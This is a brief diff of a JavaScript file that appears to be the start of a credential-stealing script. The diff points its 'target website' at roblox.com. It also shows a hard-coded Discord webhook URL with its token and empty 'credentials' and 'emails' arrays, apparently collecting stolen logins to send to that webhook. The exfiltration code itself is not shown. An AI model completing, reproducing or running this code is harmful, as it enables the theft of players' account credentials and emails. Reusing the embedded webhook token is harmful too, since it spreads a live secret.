@@ -1,6 +1,6 @@
 (function() {
     var webhookUrl = "https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4";
-    var url = "https://example.com"; // Replace with the target website
+    var url = "https://www.roblox.com/"; // Replace with the target website
     var credentials = [];
     var emails = [];
 
